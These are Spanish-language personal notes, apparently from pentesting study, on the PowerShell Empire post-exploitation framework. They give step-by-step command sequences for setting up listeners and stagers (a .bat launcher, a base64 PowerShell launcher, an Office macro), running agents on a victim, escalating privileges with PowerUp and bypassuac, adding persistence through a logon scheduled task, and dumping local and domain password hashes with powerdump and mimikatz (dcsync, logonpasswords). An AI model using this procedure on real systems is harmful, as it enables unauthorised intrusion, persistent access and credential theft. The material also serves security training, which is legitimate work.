La herramienta para pentesting con powerShell mas importante o comun
Marco de posExplotacion orientado a serviidores de windows
(MetaSlpoit es incluso mas conocido)
Puede ejecutar comandos en memoria

-escalado de privilegios

Componentes:

-listener: se ejecuta en la maquina del atacante espera una conexion a la maquina objetivo
-Agente: establece la conexion con el Listner atacante 
-stager: codigo atraves del agente a la maquina comprometida
(kali es el atacante, instalar powershell Epire)

-info: https://www.elladodelmal.com/2016/02/powershell-empire-post-explotacion-en.html
-https://github.com/EmpireProject/Empire
(clonar en kali)
-instalar con:~/Empire/Setup/install.sh
-empire ejecutable estara en Empire: ./empire
--help
(lo primero que hay que hacer es crear el listener)
--Listener(ver si hay)
--uselistener (tabulador)
--uselistener meterpreter
-- info (datos del meterpreter)
--set: para modificar nombre,host,port,ect
--execute: utilizar el listener (back si quieres volver hacia atras)
una vez tengas un escuchador ya se puede configurar un stager
---usestager (tabulador)
---usestager windows/launcher_bat
---info
---set listener nombrelistener
---execute
(creara un .bat al enviarlo a la maquina comprometida hara una conexion inversa y asi se crear un agente)
----agents

Ejemplo:
-uselistener http
-execute
-launcher (tab)powershell/python
(copiar lo que sale, esta en base64)
(es un steger)
(llevarlo a la maquina comprometida)
(ejecutarlo en CMD)
-agents (para ver que se creo el agente)
--netstat -an|more (ver la conexiones en la maquina comprometida)
-interact (agente)
-- help para ver que cosas puede hacer
-usemodule (tab) situational_awareness/network/powerview_domain_controller
(para ver cual es el controlador de dominio)
--info
-execute

ejemplo:

(usuario no priv)
-uselistener HTTP
-execute
-launcher PowerShell (pasar el launcher a la maquina objetivo)
-- python -m SimpleHTTPServer (maquina Kali)
-agents
-interact
-usemodule situational_awareness/host/antivirusproduct
-execute

Escalado de privilegios:
-usemodule privesc/powerup/allchechs (analiza y dice cual sera el que mejor se adapta para el escalado)
-execute
-back
-bypassuac http (listener,agente)
-agents
-interact (agente del bypass)
(con persistencia)
-usemodule persistence/elevated (tab) schtasks (tarea programada)(al iniciar sesion se conecta y genera el agente)
-info
-set onLogon true
-set listener (nombre)
-execute

recopilacion de Hashes (contrase√±as cifradas)

hashes locales:

(tener un listener en funcionamiento y un agente)
-interact (agente)
-usemodule credentials (tab) powerdump*(hascer un volcado de los hashes)
-execute
(el has es la segunda parte tras : despues se puede usar una herramienta como ophcrack)
(si es debil puede usarse una online como HashKiller)

hashes de dominio: 

-DCRS (Domain Controller Replicant Service)
-Native windows binaries
-WMI
--mimikats: permite el volcado de hashes y gestionarlos

(ejecutar el launcher por parte de la victima)(script de persistencia anterior)
-interact (agente que genera)
-usemodule credentials/mimikatz/(tab)dcsync_hashdump(volcado de hashes del controlador de dominio)
-info
-execute
(HashKiller con el hashes ee:***)(lo que hay tras los dos puntos)
(con dcsync: requiere que le des el user: set user loquesea)
--usemodule credentials/mimikatz/logonpasswords (de inicio de sesion de todos los usuarios)
--info
--execute
#################################################################################################################################3

- https://blog.elhacker.net/2019/08/descontinuado-proyecto-powershell-Empire-Framework.html

Ejecutar exploits:
- listener
- user listener http
- execute
-back
-usestager windows/macro (por ser de office)
- set listener http
- set Outfile /ruta/macro.txt
- execute




